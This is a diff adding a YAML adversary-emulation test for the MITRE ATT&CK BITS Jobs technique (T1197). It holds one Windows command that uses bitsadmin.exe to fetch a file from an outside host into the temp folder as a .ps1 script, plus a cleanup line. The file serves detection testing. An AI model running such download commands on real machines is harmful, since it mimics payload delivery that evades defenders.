@@ -1,0 +1,19 @@
+---
+- id: 31a63c6d775c708f307a784f73e1b410
+  name: Bitsadmin Download (cmd)
+  description: 'This test simulates an adversary leveraging bitsadmin.exe to download
+
+    and execute a payload
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1197
+    name: BITS Jobs
+  platforms:
+    windows:
+      cmd:
+        command: bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
+          %temp%\bitsadmin1_flag.ps1
+        payloads: []
+        cleanup: del %temp%\bitsadmin1_flag.ps1 >nul 2>&1
